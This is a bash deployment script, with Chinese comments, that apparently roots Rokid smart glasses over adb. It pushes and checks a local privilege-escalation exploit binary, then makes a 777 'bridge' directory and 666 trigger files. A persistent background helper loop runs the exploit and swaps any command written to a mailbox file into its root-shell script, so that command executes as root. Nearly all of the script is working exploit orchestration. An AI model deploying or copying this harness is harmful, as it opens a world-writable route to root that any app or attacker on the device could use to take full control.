#!/usr/bin/env bash
source "$(dirname "$0")/env.sh"   # 共用 ADB/SERIAL（見 deploy/env.sh）
set -u

# ===================== 依你的環境調整 =====================
SERIAL="${SERIAL:?請設定 SERIAL 或讓 env.sh 自動偵測}"
BIN="/data/local/tmp/ghostlock_rv101"
BRIDGE="/data/local/tmp/ghostlock_bridge"
HELPER="/data/local/tmp/ghostlock_bridge_helper.sh"
# ==========================================================

adb_s() { "$ADB" -s "$SERIAL" "$@"; }

# 安全殺程序 + 信箱清理（見 proc_util.sh 對「不可用 pkill -f」的實測說明）。
# 特別是 HELPER_PAT 用 `helpe` 結尾才能同時涵蓋 App 與桌面工具兩個 helper 變體：
# 舊寫法 `ghostlock_bridge_helper.sh` 實測**漏殺** `_desktop` 變體。
source "$(dirname "$0")/proc_util.sh"
# 租約檔的可寫性必須由 shell 側保證：App 對 /data/local/tmp 沒有目錄寫入權，
# 無法自行建立租約檔（實測 Permission denied）。這裡確保它以 666 存在。
source "$(dirname "$0")/lease.sh"
lease_ensure_file

echo "[1/4] 檢查 ghostlock_rv101"
if adb_s shell "[ -x $BIN ]" 2>/dev/null; then
  echo "  [+] ghostlock_rv101 就緒"
else
  echo "  [!] $BIN 不存在/不可執行，請先 push ghostlock_rv101"
  echo "      adb push <ghostlock_rv101> $BIN && adb shell chmod 755 $BIN"
  exit 1
fi

echo "[2/4] 建立 bridge 目錄並放寬權限（App 可讀寫，但仍碰不到 exploit）"
adb_s shell "mkdir -p $BRIDGE && chmod 777 $BRIDGE" || exit 1

echo "[2.5/4] 推送 root daemon（若已建置）"
DAEMON_LOCAL="/home/kali/rokid_root/deploy/root_daemon"
if [ -f "$DAEMON_LOCAL" ]; then
  adb_s push "$DAEMON_LOCAL" /data/local/tmp/root_daemon >/dev/null 2>&1
  adb_s shell "chmod 755 /data/local/tmp/root_daemon"
  echo "  [+] root_daemon 已推送"
else
  echo "  [!] 未找到 root_daemon（先跑 deploy/build_root_daemon.sh 建置）"
fi

echo "[3/4] 寫入 helper 常駐迴圈"
adb_s shell "cat > $HELPER" <<'HELPER_EOF'
#!/system/bin/sh
BRIDGE=/data/local/tmp/ghostlock_bridge
BIN=/data/local/tmp/ghostlock_rv101
ROOT=/data/local/tmp/.ghostlock_root.sh
RUNLOG=/data/local/tmp/gl_run.log
ENV="GL_PURGE_CNT=0 GL_TAIL_KILLS=16 GL_DUMMY_KILLS=0 W2_ATTEMPTS=1"
MARK="__GHOSTLOCK_PAYLOAD_DONE__"
CMD="$BRIDGE/last.cmd"
STAGE="$BRIDGE/payload.staging"
OUT="$BRIDGE/last.out"
DONE="$BRIDGE/last.done"
PROG="$BRIDGE/last.progress"
MAX_TRY=3
# 心跳：App 端無法用 ps 看到別的 process（Android 限制），
# 因此由 helper 每秒寫入時間戳，App 讀檔判斷「觸發管線是否常駐」。
HEARTBEAT="$BRIDGE/helper.alive"
PIDFILE="$BRIDGE/helper.pid"
echo $$ > "$PIDFILE" 2>/dev/null; chmod 666 "$PIDFILE" 2>/dev/null

while true; do
  date +%s > "$HEARTBEAT" 2>/dev/null; chmod 666 "$HEARTBEAT" 2>/dev/null
  if [ -f "$CMD" ]; then
    rm -f "$OUT" "$DONE" "$STAGE"
    echo "started" > "$PROG"; chmod 666 "$PROG"
    cp "$CMD" "$STAGE"
    ok=0; err="unknown"
    t=0
    while [ $t -lt $MAX_TRY ]; do
      t=$((t+1))
      echo "exploit-attempt-$t" > "$PROG"
      rm -f "$ROOT" "$RUNLOG"
      sh -c "$ENV $BIN > $RUNLOG 2>&1" &
      # 等 ready：exploit 啟動初期會寫出預設 .ghostlock_root.sh
      ready=0; i=0
      while [ $i -lt 120 ]; do
        if grep -q "dropping to root shell" "$ROOT" 2>/dev/null; then ready=1; break; fi
        if grep -q "FOPS install failed" "$RUNLOG" 2>/dev/null; then break; fi
        i=$((i+1)); sleep 1
      done
      if [ "$ready" != "1" ]; then
        err="ready-timeout-or-FOPS-failed"
        pkill -9 -f ghostlock_rv101 2>/dev/null
        continue
      fi
      echo "ready" > "$PROG"
      # 置換 payload（用 cp 保留 last.cmd 供重試）
      cp "$STAGE" "$ROOT" && chmod 755 "$ROOT"
      echo "installed" > "$PROG"
      # 等 done：payload(root) 已 echo DONE
      echo "waiting-done" > "$PROG"
      dd=0; i=0
      while [ $i -lt 200 ]; do
        if grep -q "$MARK" "$DONE" 2>/dev/null; then dd=1; break; fi
        if grep -q "FOPS install failed" "$RUNLOG" 2>/dev/null; then err="exploit-FOPS-failed"; break; fi
        i=$((i+1)); sleep 1
      done
      if [ "$dd" = "1" ]; then ok=1; break; fi
      err="done-timeout"
      pkill -9 -f ghostlock_rv101 2>/dev/null
    done
    if [ "$ok" = "1" ]; then echo "OK" > "$OUT"; echo "done" > "$PROG"; else echo "ERR:$err" > "$OUT"; echo "failed-$err" > "$PROG"; fi
    chmod 666 "$OUT" "$PROG"
    pkill -9 -f ghostlock_rv101 2>/dev/null
    rm -f "$CMD" "$STAGE"
  fi
  sleep 1
done
HELPER_EOF
adb_s shell "chmod 755 $HELPER" || exit 1

echo "[4/4] 啟動 helper（背景常駐，先清舊實例）"

# (a) 安全殺掉**兩個變體**的舊 helper。
#     舊寫法 `pkill -f ghostlock_bridge_helper.sh` 實測**漏殺** `_desktop` 變體
#     （pattern 在 "helper" 之後要求 ".sh"，而該變體是 "_desktop.sh"），
#     導致桌面板 helper 整場存活並與本 helper 同時搶共用檔案。
kill_all_helpers

# (b) 清掉信箱殘留的觸發檔——**這必須在啟動 helper 之前**。
#     裝置重開機後 helper 被重新拉起，若看到殘留的 last.cmd 就會立刻再跑一次
#     exploit（實測衍生 994 個子程序、load 75.8、adb 指令逾時）。
clear_trigger_mailboxes

sleep 1
adb_s shell "setsid sh $HELPER > /data/local/tmp/ghostlock_bridge_helper.log 2>&1 < /dev/null &"
sleep 2
adb_s shell "ps -A -o PID,ARGS 2>/dev/null | grep ghostlock_bridge_helpe | grep -v grep"

echo ""
echo "完成。眼鏡 App 會自動偵測 helper 心跳（ghostlock_bridge/helper.alive）並使用 bridge 引擎，無需重建 APK。"
echo "helper log: /data/local/tmp/ghostlock_bridge_helper.log"
